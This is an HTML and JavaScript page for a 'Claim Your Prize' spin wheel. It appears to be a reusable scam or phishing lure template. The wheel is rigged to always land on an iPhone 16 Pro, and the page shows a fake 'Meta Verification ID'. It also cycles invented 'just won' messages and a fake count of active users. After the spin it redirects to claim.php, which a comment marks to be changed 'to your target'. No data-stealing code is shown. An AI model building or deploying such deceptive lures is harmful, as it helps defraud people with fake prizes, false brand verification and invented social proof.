<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Exclusive Rewards | Spin to Win</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        
        body { 
            font-family: 'Inter', sans-serif; 
            background: radial-gradient(circle at center, #1a1a1a 0%, #050505 100%); 
            overflow: hidden;
        }

        /* The Spin Animation */
        #wheel {
            transition: transform 5s cubic-bezier(0.1, 0, 0.1, 1);
            transform: rotate(0deg);
        }

        /* Realistic Wheel Shadow & Glow */
        .wheel-outer {
            box-shadow: 0 0 100px rgba(255, 215, 0, 0.1), inset 0 0 20px rgba(0,0,0,0.5);
            background: #111;
        }

        /* The Ticker / Needle */
        .ticker {
            width: 40px;
            height: 50px;
            background: #ff4d4d;
            clip-path: polygon(50% 100%, 0% 0%, 100% 0%);
            filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5));
            z-index: 50;
        }

        .ticker-animate {
            animation: tick 0.2s ease-in-out;
        }

        @keyframes tick {
            0% { transform: translateX(-50%) rotate(0deg); }
            50% { transform: translateX(-50%) rotate(-20deg); }
            100% { transform: translateX(-50%) rotate(0deg); }
        }
    </style>
</head>
<body class="text-white min-h-screen flex flex-col items-center justify-center p-4">

    <div class="text-center mb-8 animate-pulse">
        <h1 class="text-5xl md:text-7xl font-black tracking-tighter bg-clip-text text-transparent bg-gradient-to-b from-yellow-200 via-yellow-500 to-yellow-700">
            CLAIM YOUR PRIZE
        </h1>
        <p class="text-gray-500 mt-2 tracking-widest uppercase text-xs">Meta Verification ID: #882-901-X</p>
    </div>

    <div class="relative group">
        <div id="ticker" class="ticker absolute -top-2 left-1/2 -translate-x-1/2"></div>

        <div class="wheel-outer relative w-80 h-80 md:w-[450px] md:h-[450px] rounded-full border-[12px] border-[#222] p-2">
            
            <canvas id="wheel" class="w-full h-full rounded-full shadow-2xl"></canvas>

            <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-40">
                <button id="spinBtn" onclick="spin()" class="w-24 h-24 md:w-32 md:h-32 rounded-full bg-white/10 backdrop-blur-xl border border-white/20 shadow-2xl flex flex-col items-center justify-center group-hover:scale-105 transition-transform duration-300">
                    <span class="text-black bg-white px-3 py-1 rounded-full text-[10px] font-bold mb-1">PRESS</span>
                    <span class="text-white font-black text-2xl tracking-tighter">SPIN</span>
                </button>
            </div>
        </div>
    </div>

    <div class="mt-12 w-full max-w-sm">
        <div class="bg-white/5 border border-white/10 rounded-2xl p-4 backdrop-blur-sm flex items-center gap-4">
            <div class="flex -space-x-2">
                <img src="https://i.pravatar.cc/100?u=1" class="w-8 h-8 rounded-full border-2 border-[#050505]">
                <img src="https://i.pravatar.cc/100?u=2" class="w-8 h-8 rounded-full border-2 border-[#050505]">
                <img src="https://i.pravatar.cc/100?u=3" class="w-8 h-8 rounded-full border-2 border-[#050505]">
            </div>
            <p id="status" class="text-sm text-gray-400 font-medium tracking-tight">3.2k others are spinning right now...</p>
        </div>
    </div>

    <script>
        const canvas = document.getElementById('wheel');
        const ctx = canvas.getContext('2d');
        const prizes = [
            { label: "IPHONE 16 PRO", color: "#111", text: "#fff" },
            { label: "AIRPODS MAX", color: "#C5A059", text: "#000" },
            { label: "$1,000 CASH", color: "#1a1a1a", text: "#fff" },
            { label: "IPAD PRO", color: "#D4AF37", text: "#000" },
            { label: "50% OFF CODE", color: "#111", text: "#fff" },
            { label: "MACBOOK M3", color: "#C5A059", text: "#000" }
        ];

        const centerX = 250;
        const centerY = 250;
        const radius = 250;
        canvas.width = 500;
        canvas.height = 500;

        // Draw Wheel Segments
        function drawWheel() {
            const angle = (2 * Math.PI) / prizes.length;
            prizes.forEach((prize, i) => {
                ctx.beginPath();
                ctx.fillStyle = prize.color;
                ctx.moveTo(centerX, centerY);
                ctx.arc(centerX, centerY, radius, i * angle, (i + 1) * angle);
                ctx.fill();
                ctx.lineWidth = 2;
                ctx.strokeStyle = "#222";
                ctx.stroke();

                // Add Text
                ctx.save();
                ctx.translate(centerX, centerY);
                ctx.rotate(i * angle + angle / 2);
                ctx.fillStyle = prize.text;
                ctx.font = "bold 24px Inter";
                ctx.fillText(prize.label, radius / 2.5, 10);
                ctx.restore();
            });
        }

        drawWheel();

        let isSpinning = false;

        function spin() {
            if (isSpinning) return;
            isSpinning = true;

            const wheel = document.getElementById('wheel');
            const ticker = document.getElementById('ticker');
            const btn = document.getElementById('spinBtn');

            btn.disabled = true;
            btn.style.opacity = "0.5";

            // Force a landing on the first index (iPhone 16 Pro)
            // 360 / 6 segments = 60deg per segment. 
            // 3600 (10 full spins) + offset
            const landingRotation = 3600 + 330; 
            wheel.style.transform = `rotate(${landingRotation}deg)`;

            // Ticker sound simulation
            const tickerInterval = setInterval(() => {
                ticker.classList.toggle('ticker-animate');
            }, 150);

            setTimeout(() => {
                clearInterval(tickerInterval);
                document.getElementById('status').innerText = "PRIZE SECURED! REDIRECTING...";
                document.getElementById('status').classList.add('text-green-400');
                
                setTimeout(() => {
                    window.location.href = "claim.php"; // Change this to your target
                }, 1500);
            }, 5000);
        }

        // Live status updates
        const names = ["Aadit", "Sneha", "Rahul", "Priya", "Manish"];
        const rewards = ["iPhone 16", "AirPods", "$500 Card"];
        setInterval(() => {
            if(!isSpinning) {
                const name = names[Math.floor(Math.random() * names.length)];
                const reward = rewards[Math.floor(Math.random() * rewards.length)];
                document.getElementById('status').innerText = `${name} just won an ${reward}!`;
            }
        }, 4000);
    </script>
</body>
</html>